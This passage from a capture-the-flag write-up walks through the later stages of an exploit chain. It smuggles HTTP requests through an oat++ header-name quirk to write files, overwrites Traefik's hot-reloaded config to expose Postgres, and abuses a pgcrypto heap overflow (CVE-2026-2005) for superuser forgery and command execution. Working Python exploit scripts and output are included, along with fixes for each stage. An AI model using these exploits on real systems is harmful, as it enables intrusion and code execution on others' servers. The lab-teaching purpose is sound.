WITHHELD_HEADERS = {"authorization", "cookie", "host", "content-length",
                    "connection", "transfer-encoding", "te"}

def _withheld(raw_name):
    name = str(raw_name)
    colon = name.find(":")
    if colon != -1: name = name[:colon]
    prefix = name
    for i, ch in enumerate(name):
        if ch <= " ":
            prefix = name[:i]; break
    stripped = "".join(ch for ch in name if ch > " ")
    return prefix.lower() in WITHHELD_HEADERS or stripped.lower() in WITHHELD_HEADERS
```

So every `Content-Length` and `Transfer-Encoding` variant (leading, trailing, or embedded space, tab, `Transfer-Encoding foo`, and so on) is rejected, and the classic CL.TE and TE.CL desync is closed. The only surviving primitive is the oat++ parser quirk itself: a header name like `X -Forwarded`, whose normalized forms (`x` and `x-forwarded`) are not framing headers, passes the filter, but the literal space makes oat++ drop everything after it.

The runner sends our parcel headers and body as its own outgoing POST. `requests` emits the space-in-name header on the wire, and our parcel body is the smuggled request:

```python
#!/usr/bin/env python3
import json, base64, requests
BASE  = "http://TARGET:1337"
ADMIN = "registry_session=...   # paste the admin cookie from Step 2"

def smuggled_write(path, content):                      # the smuggled request #2 (a PUT the runner can't issue)
    inner = json.dumps({"path": path, "data": base64.b64encode(content.encode()).decode()})
    return ("PUT /records/write HTTP/1.1\r\nHost: innerward\r\n"
            "Content-Type: application/json\r\n"
            f"Content-Length: {len(inner)}\r\n\r\n" + inner)

r = requests.post(f"{BASE}/admin/courier",
                  headers={"cookie": ADMIN, "content-type": "application/json"},
                  data=json.dumps({
                      "address": r"http://127.0.0.1:7200\@1.1.1.1/../status",
                      "headers": {"X -Forwarded": "x"},                       # space in the header NAME
                      "body": smuggled_write("/tmp/bellworks_poc.txt", "AFW proof: the keeper was here\n"),
                  }), allow_redirects=False)
print(f"[+] runner (POST /status) -> {r.status_code}\n{r.text.strip()}")
```

On the wire the runner sends `POST /status` with `X -Forwarded: x` followed by its automatic `Content-Length`. oat++ drops the `Content-Length`, answers `POST /status` (with `body_len=0`, because it never read the body), then parses the leftover bytes, the full `PUT /records/write`, as request 2 and performs the write.

## Exploitation

First prove the primitive on a benign path. A careful player never fires a one-shot or destructive payload before confirming it works:

```
[+] runner (POST /status) -> 200
office=crownspire-inner-ward
standing=sealed
method=POST
uri=/status
body_len=0
```

The runner's own response is just the `POST /status` reply; the smuggled write happens on request 2. Confirm inside the box:

```
$ docker exec <container> cat /tmp/bellworks_poc.txt
AFW proof: the keeper was here
```

Arbitrary file write confirmed. The POST-only front has been turned into a write through a method the runner could never issue itself.

**Fix:** reject any header name that is not a valid token (RFC 7230: no spaces or control bytes) instead of silently truncating, and have the upstream relay refuse to forward malformed header names instead of normalizing and then passing them.

---

# Step 5: Traefik hot-reload, exposing Postgres

## Vulnerability Analysis

Now, what do we write, and where? Traefik is the edge proxy, and its static config points the file provider at a watched dynamic file:

```yaml
# config/traefik/traefik.yml
providers:
  file:
    filename: /etc/traefik/dynamic.yml
    watch: true
```

`watch: true` means Traefik hot-reloads the routing config the instant the file changes, with no restart. And `/etc/traefik/dynamic.yml` is writable by the `app` service user (the same user Traefik and the inner ward run as), so the Stage 4 file write, running as `app`, can overwrite it. There is no in-app feature to edit it; the write primitive is the only thing that reaches it.

We replace the HTTP routers with a single TCP catch-all pointing at internal Postgres:

```yaml
tcp:
  routers:
    pg:
      rule: "HostSNI(`*`)"
      entryPoints: ["web"]
      service: pg
  services:
    pg:
      loadBalancer:
        servers:
          - address: "127.0.0.1:5432"
```

Traefik hot-reloads and the public port now carries raw TCP straight to Postgres. This is one-shot: it replaces the HTTP routers, so the web app disappears. Players have the source and build the box locally, so this is acceptable; in a fresh run you would do this last.

## Exploitation

Re-issue the Stage 4 smuggle, this time writing the malicious config to `/etc/traefik/dynamic.yml`, then wait for the flip:

```python
#!/usr/bin/env python3
import json, base64, time, requests, psycopg2
BASE = "http://TARGET:1337"
HOST, PORT = "TARGET", 1337
ADMIN = "registry_session=...   # paste the admin cookie from Step 2"

PG_DYNAMIC_YML = (
    'tcp:\n'
    '  routers:\n'
    '    pg:\n'
    '      rule: "HostSNI(`*`)"\n'
    '      entryPoints: ["web"]\n'
    '      service: pg\n'
    '  services:\n'
    '    pg:\n'
    '      loadBalancer:\n'
    '        servers:\n'
    '          - address: "127.0.0.1:5432"\n'
)
def smuggled_write(path, content):
    inner = json.dumps({"path": path, "data": base64.b64encode(content.encode()).decode()})
    return ("PUT /records/write HTTP/1.1\r\nHost: innerward\r\n"
            "Content-Type: application/json\r\n"
            f"Content-Length: {len(inner)}\r\n\r\n" + inner)

requests.post(f"{BASE}/admin/courier",
              headers={"cookie": ADMIN, "content-type": "application/json"},
              data=json.dumps({"address": r"http://127.0.0.1:7200\@1.1.1.1/../status",
                               "headers": {"X -Forwarded": "x"},
                               "body": smuggled_write("/etc/traefik/dynamic.yml", PG_DYNAMIC_YML)}),
              allow_redirects=False)
print("[*] dynamic.yml overwritten; waiting for Traefik to hot-reload (one-shot, kills the web app)")
for _ in range(60):
    time.sleep(1)
    try:
        psycopg2.connect(host=HOST, port=PORT, dbname="ctfdb", user="ctf_user", password="", connect_timeout=3).close()
        print("[+] Postgres now reachable on the public port as ctf_user"); break
    except Exception:
        continue
```

### Why we still cannot just read the flag

The role model is tight (`config/entrypoint.sh`):

```
local   all     all                       peer
host    ctfdb   ctf_user  127.0.0.1/32    trust
host    all     all       127.0.0.1/32    reject
host    all     all       ::1/128         reject
```

The TCP route reaches Postgres from `127.0.0.1`, so `pg_hba.conf` allows only `ctf_user@ctfdb` over TCP from loopback and rejects every other host login. The local UNIX socket uses `peer` auth, so even on-box code execution as a service user cannot run `psql -U postgres`. And `ctf_user` is non-super with no dangerous grants: no `COPY FROM PROGRAM`, no superuser. The bootstrap superuser is unreachable by design. Stage 6 is mandatory.

**Fix:** never let a fronted service have write access to the proxy's own config, run the config on a read-only mount, and do not expose internal datastores on a wildcard TCP router.

---

# Step 6: pgcrypto CVE-2026-2005, heap overflow to RCE

## Vulnerability Analysis

`ctf_user` can call pgcrypto. CVE-2026-2005 is a heap buffer overflow in `pgp_parse_pubenc_sesskey`: RSA-decrypted session-key plaintext (up to 242 bytes) is `memcpy`'d into a 32-byte buffer, which overflows the adjacent MBuf descriptor structures. By corrupting those descriptors, the decryption pipeline itself becomes a leak, arbitrary-read, and arbitrary-write engine, with no shellcode and no ROP.

The exploit (`solver/poc.py`) chains three steps:

**1. Leak.** A crafted PGP message corrupts the destination MBuf chunk header. `pfree()` then raises `pfree called with invalid pointer 0x...`, which leaks `mdst->data`, a heap address.

**2. PIE base, the porting problem.** The public PoC scans the few KB around the leak for stale postgres code pointers and matches them to ELF symbol offsets. That only works when the leaked buffer sits on the brk heap next to `.text`. On the stock Debian `postgres:17.7` build the buffer is `mmap`'d about 560 MB from the binary, so nothing code-like is nearby and the scan resolves garbage (and segfaults the backend). Instead we resolve the base deterministically from the allocator's own metadata:

> palloc'd `MemoryContext` objects sit next to the leak. Each has `NodeTag` at +0, a `methods` pointer at +16 equal to `&mcxt_methods[ASET_ID]` (a pointer into the postgres binary), and a `name` pointer at +56 into `.rodata` of the same image. We scan the heap window treating every offset as a candidate `ctx.methods`. A hit must satisfy all three constraints: `methods` lands inside the `mcxt_methods[]` symbol, the page-aligned `(methods - mcxt_methods_off)` is the base, and `ctx.name` points into `[base, base+16MB)`. The name-in-same-image constraint makes a chance match almost impossible.

This needs only the `mcxt_methods` symbol (offset and size) from the supplied `--binary`, and it is independent of ASLR and heap layout. The base is confirmed by arbitrary-reading `CurrentUserId` and matching the session OID.

**3. Privilege forgery and RCE.** With the base known, the arbitrary write sets the in-memory `CurrentUserId` to OID 10 (the bootstrap superuser), and `COPY ... FROM PROGRAM` runs an OS command as the postgres user.

This part is the exploit in `solver/poc.py`. Point it at the now-exposed Postgres (no web session needed here) and it prints the flag:

```python
#!/usr/bin/env python3
import sys
sys.path.insert(0, "solver")          # solver/poc.py is the exploit; only mcxt_methods + CurrentUserId are read
import poc
conn = {"host": "TARGET", "port": 1337, "dbname": "ctfdb", "user": "ctf_user", "password": ""}
poc.run_exploit(poc.generate_rsa_keypair(3072), conn, "postgres.debug", "/readflag")
```

```
### Leaked mdst ptr: 0x55b3498a6a38
### MemoryContext base candidates: [('0x55b339c11000', 2), ('0x55b348e34000', 1), ('0x55b348f46000', 1)]
### Testing PIE 0x000055b339c11000 (CurrentUserId @ 0x000055b33a5ad400)...
###   -> value: 16422 (0x4026) MATCH
### CONFIRMED PIE base: 0x000055b339c11000
### CurrentUserId OID Changed From 16422, To: 10
### Executing: /readflag ...
HTB{REDACTED}
```

## The flag

The flag is `/root/flag.txt` (root-only, mode `600`, `/root` mode `700`). It is reachable only through the SUID helper `/readflag`, which calls `setuid(0)` and reads it. Because every web service runs as an unprivileged user and the binaries are root-owned, the Stage 4 file write (as `app`) cannot overwrite a service binary for RCE; it can only hit its one intended Stage 5 target. The intended RCE is the Stage 6 Postgres compromise, after which:

```sql
COPY cmd_out FROM PROGRAM '/readflag';   -- HTB{...}
```

**Fix:** patch pgcrypto (CVE-2026-2005 is fixed in 17.8+), do not grant untrusted roles access to native crypto routines, and treat any in-process arbitrary read or write as a full superuser compromise.

---

# Full Solver

The complete chain is automated end to end in `solver/solve.py`. Stage 6 needs a symbol-bearing postgres ELF (the matching `postgresql-17-dbgsym`, which ships on the box under `/usr/lib/debug/.build-id/`). Only the `mcxt_methods` and `CurrentUserId` symbols are required.

```bash
# obtain the symbol-bearing postgres ELF whose build-id matches the running binary
docker cp <container>:/usr/lib/debug/.build-id/<id>.debug ./postgres.debug

python3 solver/solve.py --host <target-ip> --port 1337 --binary ./postgres.debug
#   [*] target http://<ip>:1337
#   [S1] SAML NUL differential -> CLERK session (no admin from SAML)
#   [S2] web cache deception -> sealing key reset -> ADMIN session acquired
#   [S3] courier SSRF reached the loopback Inner Ward
#   [S4] smuggled PUT /records/write -> Traefik dynamic.yml overwritten
#   [S5] Traefik hot-reloaded -> Postgres exposed on the public port (one-shot)
#   [S6] pgcrypto CVE-2026-2005 -> RCE as the postgres OS user ...
#   ========================= FLAG =========================
#   HTB{REDACTED}
```

Dependencies (attacker side): `requests`, `psycopg2`, `pwntools`, `pycryptodome`. The pgcrypto exploit lives in `solver/poc.py`; the solver imports it for Stage 6.

> **Note:** Stage 5 (the Traefik flip) is destructive and one-shot. It replaces Traefik's HTTP routers, so the web app goes away after a successful run. Restart the container before re-running the chain.

---

# Build & Deploy

```bash
./build-docker.sh        # builds the bellworks image and runs it on :1337
```

Single container, `supervisord`, one Traefik edge. The tower frontend is built from `frontend/` and shipped into `config/web` by `scripts/build-web.sh`. Notes for re-builders:

- Postgres is pinned to `17.7` (vulnerable; the CVE is fixed in 17.8+). The matching `postgresql-17-dbgsym` is fetched, pinned, from the PGDG archive so the symbols match the runtime binary.
- oat++ is pinned to commit `f83d648`, current oat++ master HEAD. The smuggling parser bug is present in it (the latest release `1.3.1` has the identical header parser).
- `requests` and `urllib3` are pinned to the tested versions. Current `urllib3` still emits the space-in-header-name on the wire; a future stricter release would break Stage 4.
- SimpleSAMLphp is pinned to `2.5.0` (PHP 8.3 from deb.sury.org, php-fpm and nginx) with the `sqlauth` module against the SQLite Portal store. The libxml2 NameID truncation is the core Stage 1 mechanic and is version-independent; SSP is pinned for reproducibility.
- Varnish is pinned to `6.0.18` (the `varnish60lts` apt repo; the 9.0 line has no bookworm build). The cache-key behavior behind the Stage 2 WCD is standard Varnish behavior (literal `req.url` hashing) and is version-independent; the pin is just for a clean bookworm install.
- nginx `1.27` is the reverse-proxy and normalizer behind Varnish. Its `%2f` decoding and `..` collapsing is the normalizer half of the Stage 2 differential.
- Everything else (Node 24, express 5, better-sqlite3 12, `@node-saml/passport-saml` 5.x, Traefik 3.7.x) is today's latest.

## Vulnerable Files (quick map)

| Stage | File | Bug |
|---|---|---|
| 1 | SimpleSAMLphp IdP (`config/ssp/*`), `src/apps/registry.js` (`/signup`, `/saml/acs`) | IdP validate-in-PHP vs serialize-in-libxml2 NameID truncation; SP domain-suffix role map to clerk (no admin from SAML) |
| 2 | `config/varnish/default.vcl`, `config/nginx/nginx.conf` (normalizer), `src/apps/bot.py`, `src/apps/registry.js` (`/appeals`, `/admin/login`, `/admin/account` auth gate, `/api/account/reset-password`) | web cache deception: Varnish keys on the literal path, nginx normalizes `%2f` and `..`, the app auth-gates `/admin/account`; confused-deputy bot caches the sealing key page, leading to an over-scoped sealing key reset and admin |
| 3 | `src/apps/courier.py` | `urlsplit` host vs `requests`/urllib3 backslash-authority (parser-differential SSRF) |
| 4 | `src/internal/inner_ward.cpp` | oat++ space-in-header-name desync, arbitrary file write |
| 5 | `config/traefik/traefik.yml` | file provider `watch:true`, config overwrite |
| 6 | Postgres 17.7 + pgcrypto | CVE-2026-2005 heap overflow, RCE |
